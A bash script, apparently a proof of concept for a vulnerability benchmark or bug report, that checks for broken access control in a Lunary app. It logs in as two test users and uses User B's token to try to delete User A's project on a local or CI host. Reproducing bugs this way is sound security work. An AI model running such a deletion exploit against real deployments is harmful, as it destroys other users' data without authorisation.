#!/bin/bash
IS_CI_RUN=$1
HOSTNAME='localhost:8080'

if [ "$IS_CI_RUN" = true ]; then
    HOSTNAME='lunary-app:3333'
fi

# Login as User A
USER_A_AUTH=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"user_a@exploit.com","password":"secret_user_a_password"}' "http://$HOSTNAME/auth/login")
echo "User A Auth: $USER_A_AUTH"

# Extract token for User A
USER_A_TOKEN=$(echo $USER_A_AUTH | grep -o '"token":"[^"]*' | sed 's/"token":"//')

# Get projects for User A
USER_A_PROJECTS=$(curl -s -X GET -H "Authorization: Bearer $USER_A_TOKEN" -H "Content-Type: application/json" "http://$HOSTNAME/v1/projects")
echo "User A Projects: $USER_A_PROJECTS"

# Count the number of projects
PROJECT_COUNT=$(echo "$USER_A_PROJECTS" | tr -cd '{' | wc -c)
echo "User A Project count: $PROJECT_COUNT"

# Extract first project ID
PROJECT_TO_DELETE=$(echo "$USER_A_PROJECTS" | sed 's/.*"id":"\([^"]*\).*/\1/' | head -n1)

# Login as User B
USER_B_AUTH=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"user_b@exploit.com","password":"secret_user_b_password"}' "http://$HOSTNAME/auth/login")
echo "User B Auth: $USER_B_AUTH"

# Extract token for User B
USER_B_TOKEN=$(echo $USER_B_AUTH | grep -o '"token":"[^"]*' | sed 's/"token":"//')

# Attempt to delete User A's project using User B's token
DELETE_RESULT=$(curl -s -X DELETE -H "Authorization: Bearer $USER_B_TOKEN" "http://$HOSTNAME/v1/projects/$PROJECT_TO_DELETE")
echo "Delete Result: $DELETE_RESULT"

# Get projects for User A
USER_A_PROJECTS=$(curl -s -X GET -H "Authorization: Bearer $USER_A_TOKEN" -H "Content-Type: application/json" "http://$HOSTNAME/v1/projects")
echo "User A Projects: $USER_A_PROJECTS"

# Count the number of projects
PROJECT_COUNT=$(echo "$USER_A_PROJECTS" | tr -cd '{' | wc -c)
echo "User A Project count: $PROJECT_COUNT"